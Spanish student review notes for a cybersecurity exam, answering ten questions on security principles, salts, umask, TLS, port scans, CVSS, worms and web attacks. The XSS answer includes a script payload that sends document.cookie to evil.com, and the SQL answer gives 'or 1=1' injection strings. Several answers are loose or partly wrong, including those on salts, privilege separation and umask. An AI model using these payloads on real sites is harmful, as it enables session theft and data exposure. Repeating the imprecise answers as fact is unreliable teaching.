---
aliases:
  - Repaso Ciberseguridad 1
tags:
"References":
cssclasses:
---
# Repaso Ciberseguridad 1

**Problema 1. (2 puntos)**

**Describa en qué consiste el principio de seguridad conocido como fail-safe defaults. Explique por qué es importante en el diseño de sistemas seguros y proporcione un ejemplo real de su aplicación práctica.**

Este principio consiste en que, por defecto, el sistema nunca permita el acceso al usuario. El usuario debe de conseguir los permisos explícitos para poder acceder y realizar las acciones determinadas.

En código, puede ver tal que así:

```python
IS_ALLOWED = check_credentials_user()
if IS_ALLOWED:
	# do something
else:
	# do not access the resources
```

De esta forma, incluso si el programa genera una excepción, un fallo de ejecución, un puntero *null* o una corrupción en la memoria, nunca podrá acceder a dicho recurso a no ser que explícitamente tenga los permisos necesarios para hacerlo.

---

**Problema 2. (2 puntos)**

**Explique el propósito del campo salt en el almacenamiento de contraseñas. Discuta por qué incrementa la seguridad frente a ataques como diccionarios y rainbow tables.**

El principal problema de los *hashes* es que son deterministas, un mismo *input* siempre generará el mismo *hash*. Esto, y además sabiendo que una misma función puede generar un resultado idéntico para dos inputs distintos (colisiones), hace de los *hashes* un problema. 

Añadiendo el *salt*, añadimos aleatoriedad al resultado. Se introducen una serie bits/bytes/contenidos aleatorios que permiten que la función de *hash* no sea determinista. De esta manera, se mejora la seguridad de los posibles resultados; ya que dos usuarios distintos pueden tener la misma contraseña (o distintas pero que generen una colisión) y de esta forma eliminar esa colisión o añadir esa aleatoriedad a la función *hash*.

El *salt* no hace que el *hash* deje de ser determinista, sino que se añade algo extra aleatorio. Evita reutilización de tablas precomputadas (tablas arcoiris). 

---

**Problema 3. (1,5 puntos)**

**Suponga un sistema Linux con permisos por defecto 666 para archivos y 777 para directorios.  Si el usuario establece umask = 022, indique:**

1. **Los permisos finales de un archivo recién creado**
2. **Los permisos finales de un directorio recién creado**

**Justifique su respuesta.**

1. $666 - 022 = 644$
2. $777 -  022 = 755$

---

**Problema 4. (2 puntos)**

**Describa cómo funciona un ataque de cross-site scripting (XSS).**
**Incluya:**
- **Los pasos del ataque**
- **Un ejemplo con una URL ficticia**
- **Un script mínimo que muestre el impacto del ataque**

Un ataque *cross-site scripting* (XSS) se basa en la inserción de código malicioso en URLs (o sistemas, dependiendo de si es reflejado o ampliado) que se ejecuta en las máquinas de las víctimas con la motivación de robar contenidos de su sistema/navegador como puede ser el uso de las cookies o los tokens de autenticación.

Supongamos que existe la URL: `https://www.example.com/q?buscar=HOLA`

1. El atacante inyecta en la URL un código malicioso como: `https://www.example.com/q?buscar=<script>fetch("https://evil.com?c="+document.cookie)</script>
2. El usuario hace *click* en el enlace, accediendo a la página web. El contenido puede parecer legítimo pero se ejecuta la script maliciosa en su navegador
3. El atacante accede a las *cookies* del usuario y las envía a un sistema controlado por el atacante, donde se usarán para suplantar la identidad.

---

**Problema 5. (1,5 puntos)**

**Enumere y describa todos los pasos que realiza un cliente TLS para confiar en el certificado del servidor durante el TLS handshake. Explique por qué cada comprobación es necesaria.**

1. Recibe el certificado de la entidad a confiar. La clave pública de dicha entidad se encuentra, valga la redundancia, pública en la red.
2. El cliente valida a la entidad y valida la cadena de certificados hasta la CA raíz (incluida).
3. El cliente valida que los certificados se encuentren dentro del margen temporal esperado(NO ANTES y NO DESPUÉS).
4. El cliente verifica que ninguna de las entidades tenga certificados revocados.
5. Se verifica el nombre del certificado con el del servidor
6. Si todo es correcto, el cliente confía en el certificado del servidor.

---

**Problema 6. (1,5 puntos)**

**Describa dos técnicas diferentes de escaneo de puertos usando TCP. Indique las ventajas y desventajas de cada una desde el punto de vista del atacante y del defensor.**

Existen dos tipos de escaneo: a través de TCP-SYN y de TCP. 

**TCP-SYN**
El atacante envía paquetes SYN a la red, buscando escanearlas. Al atacante no le interesa acabar la comunicación, solamente ver qué puertos se encuentran abiertos. Por ende, la búsqueda es muy rápida, y además deja una huella más pequeña que encontrar en la red; pero puede ser que perdamos algo de información relevante al no completar la comunicación.

**TCP**
El atacante sacrifica la velocidad del método anterior, acabando la comunicación TCP en su totalidad principio-fin. De esta manera, es menos complicado rastrear la comunicación de los paquetes y es más complicado evitarlos, a costa de ser muchísimo más lento. Se obtiene más información de los puertos.

---

**Problema 7. (1,5 puntos)**

**Describa las métricas base de la vulnerabilidad representada por el siguiente vector CVSS:**

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

**Explique brevemente el significado de cada métrica.**

Attack Vector: Network. El ataque ocurre a través de la red; esto hace que la vulnerabilidad escale hacia los puestos más altos en la puntuación CVSS. También puede ser adyacente, física...
Attack Complexity: Low. El atacante no tiene grandes complicaciones para realizar el ataque.
Privileges Required: None. No se requiere de usuario administrador o root para realizar el ataque, lo que aumenta la puntuación de vulnerabilidad.
User Interaction: Required. Se requiere de una comunicación e interacción cliente-atacante (mediante phishing, estafas indias...)
Scope: Unchanged. El ataque puede afectar a otros componentes, no solo al atacado. En este caso, ese no es el caso.
Confidentiality, Integrity, Availability: High, High, None respectivamente. 

---

**Problema 8. (2 puntos)**

**Una aplicación web construye la siguiente consulta SQL usando datos introducidos por el usuario:**

```sql
String query = "SELECT * FROM items WHERE owner = '" + userName +
               "' AND itemname = '" + itemName + "'";
```

**Explique cómo puede explotarse este código mediante un ataque de inyección SQL. Incluya un ejemplo concreto de entrada maliciosa y describa el resultado.**

Podemos ver un claro ejemplo donde las comillas `'` suponen una condición. Sobrescribiendo una variable, como por ejemplo 

`userName = "alice"' or '1 = 1'`
`itemName = "x"' or '1 = 1'`

que como se puede ver siempre se cumple, se puede devolver todos los *items* de la base de datos en dicha máquina.

---

**Problema 9. (2 puntos)**

**Un gusano de Internet se propaga explotando vulnerabilidades en otros sistemas.**

1. **Explique por qué reinfectar un sistema ya infectado puede ser problemático**
2. **Describa dos técnicas para detectar remotamente sistemas ya infectados**
3. **Explique cómo alguna de estas técnicas puede ayudar a los defensores**

Respondiendo vemos que:
1. Reinfectar (no actualizar) un sistema es problemático por varios motivos: tener múltiples instancias del mismo proceso malicioso corriendo puede generar errores inesperados en el sistema. Además, la consumición de recursos del propio sistema puede aumentar y por lo tanto facilitar la detección.
2. **Sondeo de puertos** y **firmas**. Respectivamente, cuando un gusano va a infectar una máquina primero comprueba si existe algún puerto abierto que corresponda con unos que él tiene *hardcoded*. De haberlo, el gusano sabe que está infectado y que puede pasar de él. Por otro lado, el gusano también puede enviar mensajes al nuevo gusano (un archivo por ejemplo) que deje una firma para que identifique que dicho sistema ha sido infectado.
3. Las firmas permiten que, si son detectadas, se tenga una solución temporal al virus para poder evitar su propagación, además de poder trabajar con él en entornos controlados. De la misma manera, se puede simular puertos abiertos/cerrados para tratar simular sistemas infectados/no infectados y atraer *malware* (como si fuese una *honeypot*).

---

**Problema 10. (1,5 puntos)**

**Describa el principio de seguridad conocido como separación de privilegios. Explique cómo reduce el impacto de vulnerabilidades y proporcione un ejemplo real en sistemas o servicios actuales.**

El principio de separación de privilegios supone que todos los componentes del sistema deben de contener *el mínimo de privilegios necesarios* para funcionar correctamente. De esta manera, ningún componente tiene más permisos de los necesarios y no puede usarse para realizar acciones que, en su contexto, no debería.

Por ejemplo, en sistemas Unix se separan procesos privilegiados y no privilegiados, o se usa `sudo` para elevar privilegios solo durante operaciones concretas.